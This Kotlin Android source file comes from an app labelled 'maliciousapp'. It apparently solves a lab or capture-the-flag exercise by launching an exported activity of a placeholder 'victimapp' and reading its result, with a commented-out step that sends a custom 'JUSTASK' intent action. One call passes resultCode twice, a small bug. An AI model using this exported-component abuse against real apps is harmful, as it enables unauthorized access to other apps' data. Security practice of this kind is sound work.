package com.example.maliciousapp

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.app.Activity
import android.content.Intent
import android.content.ComponentName
import android.widget.TextView

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // PartOne
        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.PartOne"
            )
        }
        startActivityForResult(intent, 1)

        // // PartTwo
        // val sendIntent: Intent = Intent().apply {
        //     action = "com.example.victimapp.intent.action.JUSTASK"
        // }
        // startActivity(sendIntent)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
        super.onActivityResult(resultCode, resultCode, intent)

        val view = findViewById<TextView>(R.id.debug_text)
        view.text = "Result code: $resultCode"
    }
}
